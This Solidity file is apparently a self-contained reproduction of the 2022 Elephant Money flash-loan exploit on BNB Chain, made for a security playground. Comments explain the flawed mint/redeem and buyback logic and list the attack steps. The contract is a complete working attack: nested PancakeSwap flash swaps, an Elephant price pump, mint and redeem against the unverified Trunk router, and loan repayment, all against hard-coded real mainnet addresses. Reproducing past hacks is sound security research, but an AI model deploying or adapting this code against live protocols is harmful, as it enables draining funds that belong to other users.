// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Elephant_Money).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract: the
// nested Pancake flash-swap callback `pancakeCall` lives on the test itself, so
// there is no standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit + pancakeCall + attack)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/Elephant_Money_exp.sol.
//
// VULNERABILITY: Asymmetric mint/redeem + spot-price-dependent Elephant buyback in unverified Trunk router (InotVerified)
// Root cause: InotVerified.mint(BUSD_amount) pulls BUSD, mints Trunk at fixed ~0.99 ratio to caller, *and* performs
// an internal buyback swap (BUSD -> Elephant via router) sending Elephant to treasury. redeem(Trunk_amount) burns Trunk
// and returns (near) full nominal BUSD without any reverse Elephant sell or price-based adjustment.
// No TWAP, no slippage guard, no reentrancy/price sanity. Elephant is a 10% fee-on-transfer token vs WBNB on Pancake.
// Impact: Attacker with flash capital can force protocol to acquire backing (Elephant) at manipulated high price,
// extract the BUSD "spent" via immediate redeem (which ignores the buyback cost), leaving under-backed Trunk
// for other users. ~real-world loss was millions in BUSD. The fixed haircut + one-way buyback creates extractable gap
// whenever Elephant spot price can be inflated atomically.
// Code refs: notVerified.mint, notVerified.redeem, path1 buy, path2 sell, pancakeCall, run()
// EXPLOIT STEPS:
// 1. Flash-loan 100k WBNB (from WBNB_USDT_PAIR) + nested 90M BUSD (from BUSD_USDT_PAIR) via pancakeCall reentrancy.
// 2. wbnb.withdraw + router.swapExactETHForTokensSupportingFeeOnTransferTokens (buy Elephant) -> inflates Elephant/WBNB price.
// 3. notVerified.mint(90M BUSD) -> protocol pulls BUSD, mints Trunk@0.99, does internal buy-Elephant at *inflated* price (acquires less backing per BUSD).
// 4. Sell attacker's Elephant back for WBNB (path2) at the still-favorable (pre-dump) rate.
// 5. notVerified.redeem(all Trunk) -> receive full BUSD (more than the internal buyback "spent"), no symmetric Elephant sale.
// 6. Dump any residual Elephant for WBNB, repay flashes with small premium (100.3k / 90.3M), keep profit in BUSD/WBNB.
// 7. Profit realized because redeem payout decoupled from the buyback cost and price was not time-weighted.
//
// (Original short note preserved below for reference.)
// Root cause: the unverified Trunk router (0xD520a3B4…) mints Trunk at a fixed
// 0.99 ratio against BUSD while its mint() performs an internal Elephant buy-back
// that redeem() does NOT symmetrically undo. By flash-pushing the Elephant price
// up first, mint→redeem returns more BUSD than the buy-back spent — extracting the
// gap. Profit ends as BUSD on this contract.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface InotVerified {
    function mint(uint256 value) external;
    function redeem(uint256 value) external;
}

contract ElephantMoneyDrain {
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair constant BUSD_USDT_PAIR = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair constant ELEPHANT_WBNB_PAIR = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
    IPancakePair constant WBNB_USDT_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
    IERC20 constant trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IRouter constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    InotVerified constant notVerified = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);

    address[] path1 = [address(wbnb), address(elephant)];
    address[] path2 = [address(elephant), address(wbnb)];
    address[] path4 = [address(wbnb), address(busd)];

    constructor() {
        elephant.approve(address(router), type(uint256).max);
        trunk.approve(address(router), type(uint256).max);
        trunk.approve(address(notVerified), type(uint256).max);
        busd.approve(address(notVerified), type(uint256).max);
        wbnb.approve(address(router), type(uint256).max);
    }

    // Entry point: kick off the nested flash-loan stack from the WBNB/USDT pair.
    function run() external {
        WBNB_USDT_PAIR.swap(0, 100_000 ether, address(this), "0x00");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(WBNB_USDT_PAIR)) {
            BUSD_USDT_PAIR.swap(0, 90_000_000 ether, address(this), "0x00");
        } else {
            attack();
        }
    }

    function attack() public {
        wbnb.withdraw(100_000 ether);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(
            0, path1, address(this), block.timestamp
        );

        uint256 balanceElephant = elephant.balanceOf(address(this));

        notVerified.mint(90_000_000 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balanceElephant, 0, path2, address(this), block.timestamp
        );

        uint256 balanceTrunk = trunk.balanceOf(address(this));

        notVerified.redeem(balanceTrunk);

        uint256 b3 = elephant.balanceOf(address(this));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path2, address(this), block.timestamp);

        wbnb.transfer(address(WBNB_USDT_PAIR), 100_300 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path4, address(this), block.timestamp
        );

        busd.transfer(address(BUSD_USDT_PAIR), 90_300_000 ether);
    }

    receive() external payable {}
}
